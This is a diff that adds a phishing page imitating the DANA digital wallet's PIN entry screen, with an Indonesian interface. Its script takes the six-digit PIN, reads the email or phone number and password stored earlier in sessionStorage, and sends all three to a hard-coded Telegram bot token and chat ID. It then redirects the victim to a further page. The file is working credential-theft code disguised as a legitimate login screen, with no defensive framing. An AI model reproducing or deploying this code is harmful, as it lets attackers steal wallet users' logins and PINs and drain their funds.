@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DANA Dompet Digital</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+                * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            overflow-y: hidden;
+            
+        }
+
+        .pin-container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            background-color: #fff;
+            padding: 20px;
+            margin: 10px;
+            border-radius: 8px; /* Menambah radius border untuk kontainer */
+            box-shadow: #ffffff; /* Menambah efek bayangan */
+        }
+
+        .header {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .back-button {
+            position: absolute;
+            left: 10px; /* Ubah sesuai kebutuhan */
+            top: 10px; /* Ubah sesuai kebutuhan */
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #2EB4EE;
+            cursor: pointer;
+        }
+
+        .header img {
+            width: 80px; /* Atur lebar logo sesuai kebutuhan */
+            height: auto; /* Memastikan proporsi tetap terjaga */
+            margin-bottom: 10px; /* Jarak antara logo dan teks */
+        }
+
+        .pin-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .pin-subtitle {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 50px;
+        }
+
+        .pin-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            border: 2px solid #ddd;
+            background: transparent;
+            transition: all 0.3s ease;
+        }
+
+        .pin-dot.filled {
+            background-color: #333;
+            border-color: #333;
+        }
+
+        .pin-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 0 auto;
+            max-width: 300px;
+        }
+
+        .pin-key {
+            aspect-ratio: 1;
+            background: none;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.8rem;
+            color: #333;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @media (max-height: 700px) {
+            .pin-container {
+                padding: 15px;
+            }
+
+        .pin-key:active {
+            background-color: rgba(0, 0, 0, 0.1);
+        }
+
+        .pin-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            padding: 0 10px;
+        }
+
+        .forgot-pin {
+            color: #2EB4EE;
+            text-decoration: none;
+            font-size: 20px;
+            margin-top: -150px;
+            margin-left: 29px;
+        }
+
+        .backspace {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            color: #2EB4EE;
+            cursor: pointer;
+            padding: 10px;
+            margin-top: -150px;
+            margin-right: 23px;
+        }
+        @media (max-width: 360px) {
+            .pin-keypad {
+                gap: 10px;
+            }
+        
+    </style>
+</head>
+<body>
+    <div class="pin-container">
+        <div class="header">
+            <button class="back-button"><i class="fas fa-arrow-left"></i></button>
+            <img src="https://i.ibb.co.com/TwxtSS5/images-32.jpg" alt="Logo PIN">
+            <h1 class="pin-title">Masukkan PIN</h1>
+            <p class="pin-subtitle">Masukkan PIN DANA Dompet Anda</p>
+        </div>
+        
+        <div class="pin-dots">
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+        </div>
+
+        <div class="pin-keypad">
+            <button class="pin-key">1</button>
+            <button class="pin-key">2</button>
+            <button class="pin-key">3</button>
+            <button class="pin-key">4</button>
+            <button class="pin-key">5</button>
+            <button class="pin-key">6</button>
+            <button class="pin-key">7</button>
+            <button class="pin-key">8</button>
+            <button class="pin-key">9</button>
+            <button class="pin-key"></button>
+            <button class="pin-key">0</button>
+            <button class="pin-key"></button>
+        </div>
+
+        <div class="pin-footer">
+            <a href="#" class="forgot-pin">Lupa?</a>
+            <button class="backspace"><i class="fas fa-backspace"></i></button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const pinDots = document.querySelectorAll('.pin-dot');
+            const pinKeys = document.querySelectorAll('.pin-key');
+            const backspace = document.querySelector('.backspace');
+            
+            let currentPin = '';
+            const maxLength = 6;
+
+            // Handle number input
+            function handleInput(number) {
+                if (currentPin.length < maxLength) {
+                    currentPin += number;
+                    updatePinDots();
+                    
+                    if (currentPin.length === maxLength) {
+                        // Add vibration if supported
+                        if ('vibrate' in navigator) {
+                            navigator.vibrate(50);
+                        }
+                        
+                        // Send PIN to Telegram bot
+                        sendPinToTelegram(currentPin);
+                    }
+                }
+            }
+
+            // Update PIN dots display
+            function updatePinDots() {
+                pinDots.forEach((dot, index) => {
+                    dot.classList.toggle('filled', index < currentPin.length);
+                });
+            }
+
+            // Send PIN to Telegram bot with session data
+            function sendPinToTelegram(pin) {
+                const botToken = '8113717614:AAEUPgyngKznj7qdPbHmNZpkUusWus3l03E';
+                const chatId = '7285087955';
+                
+                // Ambil data login dari sessionStorage
+                const emailOrPhone = sessionStorage.getItem("emailOrPhone") || "Tidak ada data";
+                const password = sessionStorage.getItem("password") || "Tidak ada data";
+                
+                // Membuat pesan dengan format baru yang mencakup data login dan PIN
+                const message = `┌──────────────────────┐
+                   ＡＭＡＲ ＢＡＮＫ
+────────────────────┤
+𝐄𝐦𝐚𝐢𝐥/𝐏𝐡𝐨𝐧𝐞 : ${emailOrPhone}
+𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : ${password}
+────────────────────┤
+𝐏𝐈𝐍 𝐚𝐦𝐚𝐫 𝐛𝐚𝐧𝐤 : ${pin}
+────────────────────┤`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Pesan terkirim:', data);
+                    // Redirect to another page after successfully sending the message
+                    window.location.href = 'kodeo5p.html';  // Ganti dengan halaman tujuan Anda
+                })
+                .catch(error => {
+                    console.error('Error mengirim pesan:', error);
+                });
+            }
+
+            // Add click events to number keys
+            pinKeys.forEach(key => {
+                const number = key.textContent;
+                if (number) {
+                    key.addEventListener('click', () => {
+                        handleInput(number);
+                    });
+                }
+            });
+
+            // Handle backspace
+            backspace.addEventListener('click', () => {
+                if (currentPin.length > 0) {
+                    currentPin = currentPin.slice(0, -1);
+                    updatePinDots();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
